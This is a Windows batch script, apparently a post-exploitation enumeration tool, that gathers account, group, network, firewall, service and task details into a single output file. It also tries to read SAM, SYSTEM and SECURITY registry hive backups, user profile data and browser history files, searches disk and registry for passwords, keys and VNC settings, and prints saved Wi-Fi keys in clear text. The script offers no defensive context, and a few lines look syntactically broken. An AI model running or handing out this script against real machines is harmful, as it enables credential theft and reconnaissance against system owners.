@echo off
echo ======= Enumerating users and accounts =======
whoami /all > enumout.txt   
query session >> enumout.txt  
query user >> enumout.txt   
echo %username% >> enumout.txt   
net user >> enumout.txt
net localgroup >> enumout.txt
  
net localgroup administrators >> enumout.txt  
  
net accounts >> enumout.txt
echo ======= Enumerating network settings =======
  
net share >> enumout.txt  
  
gpresult /z >> enumout.txt 
 
arp -a >> enumout.txt 
  
netsh advfirewall firewall show rule name=all >> enumout.txt  
  
type %SYSTEMDRIVE%\boot.ini >> enumout.txt   
  
type %WINDIR%\win.ini >> enumout.txt 
  
type %WINDIR%\System32\drivers\etc\hosts >> enumout.txt
echo ======= Enumerating system information =======  
  
type %SYSTEMDRIVE%\pagefile.sys >> enumout.txt  
  
type %WINDIR%\debug\NetSetup.log >> enumout.txt  
  
type %WINDIR%\repair\sam >> enumout.txt 
  
type %WINDIR%\repair\system >> enumout.txt 
  
type %WINDIR%\repair\software >> enumout.txt 
  
type %WINDIR%\repair\security >> enumout.txt 
  
type %WINDIR%\iis6.log >> enumout.txt  
  
type %WINDIR%\system32\config\AppEvent.Evt >> enumout.txt  
  
type %WINDIR%\system32\config\SecEvent.Evt >> enumout.txt  
 
type %WINDIR%\system32\config\default.sav >> enumout.txt  
  
type %WINDIR%\system32\config\security.sav >> enumout.txt  
  
type %WINDIR%\system32\config\software.sav >> enumout.txt  
  
type %WINDIR%\system32\config\system.sav >> enumout.txt  
 
type %WINDIR%\system32\CCM\logs\*.log >> enumout.txt 
 
type %USERPROFILE%\ntuser.dat >> enumout.txt  
  
type %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat >> enumout.txt  
  
systeminfo >> enumout.txt
  
driverquery >> enumout.txt 
 
tasklist /v >> enumout.txt 
  
fsutil fsinfo drives >> enumout.txt 
  
set >> enumout.txt 
  
qwinsta >> enumout.txt 
  
net time >> enumout.txt  
  
net file >> enumout.txt  
  
net session >> enumout.txt 
  
sc queryex type= service state= all >> enumout.txt 
  
netstat -ano >> enumout.txt 
  
netstat -r >> enumout.txt 
  
wevtutil el >> enumout.txt 
  
schtasks /query /fo LIST /v >> enumout.txt 
echo ======= Enumerating wmic =======  
wmic product get name /value /format:csv | find /v "" >> enumout.txt 
echo ======= Enumerating files and registry =======  
dir /s *pass* == *key* == *vnc* == *.config* >> enumout.txt 
 
reg query HKLM /f pass /t REG_SZ /s >> enumout.txt 

reg query HKCU /f pass /t REG_SZ /s >> enumout.txt 
 
netsh wlan show profile >> enumout.txt 
  
netsh wlan show profile <SSID> key=clear >> enumout.txt  
